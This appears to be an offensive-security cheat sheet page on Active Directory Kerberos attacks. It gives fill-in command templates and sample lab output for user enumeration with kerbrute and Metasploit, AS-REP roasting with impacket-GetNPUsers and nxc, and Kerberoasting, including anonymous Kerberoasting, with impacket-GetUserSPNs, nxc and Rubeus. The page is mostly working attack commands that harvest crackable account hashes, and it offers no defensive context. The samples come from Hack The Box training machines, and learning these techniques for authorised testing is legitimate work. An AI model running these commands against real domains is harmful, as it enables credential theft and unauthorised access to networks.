---
title: "Kerberoasting"
tags: ["Active Directory", "Kerberoasting", "Asreproast", "Domain Controller", "GetNPUsers", "Impacket", "Kerberos", "Rubeus", "Windows"]
---

{{< filter_buttons >}}

### Users Enum

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}
{{< tab set1-1 tab1 active>}}kerbrute{{< /tab >}}{{< tab set1-1 tab2 >}}metasploit{{< /tab >}}
{{< tabcontent set1-1 tab1 >}}

```console
kerbrute userenum --domain <DOMAIN> --dc <DC> <USERS_FILE>
```

```console {class="sample-code"}
$ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop

2024/09/24 14:54:41 >  Using KDC(s):
2024/09/24 14:54:41 >   dc.absolute.htb:88

2024/09/24 14:54:41 >  [+] VALID USERNAME:       j.roberts@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       s.osvald@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       d.klay@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       j.robinson@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       n.smith@absolute.htb
2024/09/24 14:54:42 >  Done! Tested 88 usernames (6 valid) in 0.491 seconds
```

<small>*Ref: [kerbrute](https://github.com/ropnop/kerbrute)*</small>

{{< /tabcontent >}}
{{< tabcontent set1-1 tab2 >}}

```console
use auxiliary/gather/kerberos_enumusers
```

```console
set user_file <USERS_FILE>
set rhosts <DC>
set domain <DOMAIN>
run
```

```console {class="sample-code"}
msf6 auxiliary(gather/kerberos_enumusers) > run

[*] Using domain: DANTE - 172.16.2.1:88        ...
[*] 172.16.2.1 - User: "user1" user not found
[*] 172.16.2.1 - User: "user2" user not found
[*] 172.16.2.1 - User: "user3" user not found
[+] 172.16.2.1 - User: "user4" does not require preauthentication. Hash: $krb5asrep$23$ ---[SNIP]--- 9161d63be1
---[SNIP]---
[*] Auxiliary module execution completed
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
TO-DO
```

{{< /tabcontent >}}

---

### AS_REP Roasting

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}
{{< tab set2-1 tab1 active>}}impacket{{< /tab >}}{{< tab set2-1 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set2-1 tab1 >}}

```console
# Multiple users
impacket-GetNPUsers '<DOMAIN>/' -usersfile <USERS> -no-pass -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ impacket-GetNPUsers ABSOLUTE.HTB/ -usersfile valid_usernames.txt -no-pass -dc-ip DC.ABSOLUTE.HTB
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$d.klay@ABSOLUTE.HTB:85554d22d5c220d8a757ce9913d207ea$7288c91ca ---[SNIP]--- 0e09c5d9d1
[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

```console
# Single user
impacket-GetNPUsers '<DOMAIN>/<USER>' -no-pass -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ impacket-GetNPUsers -no-pass -dc-ip 10.10.11.181 ABSOLUTE.HTB/d.klay
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for d.klay
$krb5asrep$23$d.klay@ABSOLUTE.HTB:97c9a3ec7b550c29bc52f0c176738e73$ab25b07d4 ---[SNIP]--- 78a8e52bb6
```

{{< /tabcontent >}}
{{< tabcontent set2-1 tab2 >}}

```console
# Multiple users
nxc ldap <DC> -u <USERS> -p '' --asreproast as_rep_hashes.txt
```

```console {class="sample-code"}
$ nxc ldap 10.10.11.181 -u valid_usernames.txt -p '' --asreproast as_rep_hashes.txt
SMB         10.10.11.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.181    445    DC               $krb5asrep$23$d.klay@ABSOLUTE.HTB:5a082acfc8 ---[SNIP]--- 06ddb9be16
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
TO-DO
```

{{< /tabcontent >}}

---

### Kerberoasting

{{< tab set3 tab1 >}}Linux{{< /tab >}}
{{< tab set3 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set3 tab1 >}}
{{< tab set3-1 tab1 >}}impacket{{< /tab >}}{{< tab set3-1 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set3-1 tab1 >}}

```console {class="password"}
# Password
sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

```console {class="ntlm"}
# NTLM
sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-host <DC>
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-host <DC>
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>' -k -no-pass -dc-host <DC>
```

#### Anonymous Kerberoasting

```console
sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/' -usersfile <USERS> -no-preauth <USER_WITH_NO_PREAUTH> -dc-host <DC> 
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.rebound.htb && impacket-GetUserSPNs -no-preauth jjones -usersfile valid_usernames.txt -dc-host 10.10.11.231 rebound.htb/
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$d989a5d49 ---[SNIP]--- 962d2aa2f2
---[SNIP]---
```

<small>*Note: Times skew have to be within 5 minutes in kerberos*</small>

{{< /tabcontent >}}
{{< tabcontent set3-1 tab2 >}}

```console {class="password"}
# Password
sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --kerberoasting kerberoast_hashes.txt
```

```console {class="ntlm"}
# NTLM
sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -H '<HASH>' -d <DOMAIN> --kerberoasting kerberoast_hashes.txt
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> --kerberoasting kerberoast_hashes.txt
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> --kerberoasting kerberoast_hashes.txt
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC_IP> && nxc ldap <DC_IP> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> --kerberoasting kerberoast_hashes.txt
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
.\rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:'<PASSWORD>'
```

{{< /tabcontent >}}

<br>